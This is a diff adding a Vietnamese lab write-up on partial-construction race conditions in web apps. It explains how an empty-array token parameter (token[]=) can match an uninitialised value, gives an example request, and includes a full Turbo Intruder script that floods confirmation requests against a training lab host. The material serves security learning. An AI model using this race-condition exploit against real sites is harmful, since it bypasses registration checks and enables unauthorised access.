@@ -315,3 +315,79 @@ Lấy token ở phần cuối URL và thay vào vị trí tại request `POST /f
 Tức là ta đã đổi thành công mật khẩu của carlos, đăng nhập và tiến hành xóa carlos
 
 ![alt text](images/image-23.png)
+
+## Điều kiện race do quá trình khởi tạo từng phần
+
+Nhiều ứng dụng tạo đối tượng qua nhiều bước, điều này có thể tạo ra một trạng thái trung gian tạm thời, trong đó đối tượng có thể bị khai thác.
+
+Ví dụ, khi đăng ký một người dùng mới, một ứng dụng có thể tạo người dùng trong cơ sở dữ liệu và thiết lập API key của họ bằng hai câu lệnh SQL riêng biệt. Điều này tạo ra một khoảng thời gian rất ngắn trong đó người dùng đã tồn tại, nhưng API key của họ vẫn chưa được khởi tạo.
+
+Loại hành vi này mở đường cho các khai thác, trong đó bạn chèn một giá trị đầu vào trả về một giá trị khớp với giá trị cơ sở dữ liệu chưa được khởi tạo, chẳng hạn như một chuỗi rỗng ("") hoặc null trong JSON, và giá trị này được so sánh như một phần của cơ chế kiểm soát bảo mật.
+
+Các framework thường cho phép truyền mảng và các cấu trúc dữ liệu không phải chuỗi khác bằng cú pháp không tiêu chuẩn. Ví dụ, trong PHP:
+- param[]=foo tương đương với param = ['foo']
+- param[]=foo&param[]=bar tương đương với param = ['foo', 'bar']
+- param[] tương đương với param = []
+
+Ruby on Rails cũng cho phép làm điều tương tự bằng cách cung cấp một tham số truy vấn hoặc tham số POST có khóa nhưng không có giá trị. Nói cách khác, param[key] sẽ tạo ra đối tượng phía máy chủ như sau: `params = {"param"=>{"key"=>nil}}`
+
+Trong ví dụ ở trên, điều này có nghĩa là trong khoảng thời gian race window, có thể có khả năng thực hiện các yêu cầu API đã được xác thực như sau:
+
+```
+GET /api/user/info?user=victim&api-key[]= HTTP/2
+Host: vulnerable-website.com
+```
+
+Lab 6: Partial construction race conditions
+
+![alt text](images/image-24.png)
+
+Vào burp suite và xem nội dung file `/resources/static/users.js` có thấy api xác nhận đăng ký
+
+![alt text](images/image-25.png)
+
+Gửi request này tới Repeater và đổi lại phương thức `POST /confirm?token[]=` sau đó nhóm với request đăng ký, ta thấy request xác nhận luôn chạy nhanh hơn request đăng ký. Để race condition ở đây thì cần request xác nhận phải chạy đồng thời với request đăng ký.
+
+![alt text](images/image-26.png)
+
+Gửi request đăng ký tới Intruder Turbo, chọn `examples/race-single-packet-attack.py` sau đó paste nội dung sau:
+```
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+    
+    confirmationReq = '''POST /confirm?token[]= HTTP/2
+Host: 0ac000b903d21235812a614100dc0098.web-security-academy.net
+Cookie: phpsessionid=D4kubc97mk51mbn52hKVcmsMktdF5F0J
+Content-Length: 0
+
+'''
+    for attempt in range(20):
+        currentAttempt = str(attempt)
+        username = "user" + str(int(time.time()*1000)) + currentAttempt
+    
+        # Queue một request đăng ký
+        engine.queue(target.req, username, gate=currentAttempt)
+        
+        # Queue 50 request xác nhận
+        # Có thể chúng sẽ được gửi thành hai packet
+        for i in range(50):
+            engine.queue(confirmationReq, gate=currentAttempt)
+        
+        # Mở gate để gửi toàn bộ request của lần thử này
+        engine.openGate(currentAttempt)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+Sau đó bấm attack, ta thu được 1 payload xác nhận đăng ký thành công
+
+![alt text](images/image-27.png)
+
+Sau đó đăng nhập vào và tiến hành xóa carlos để solve bài lab
+
+![alt text](images/image-28.png)
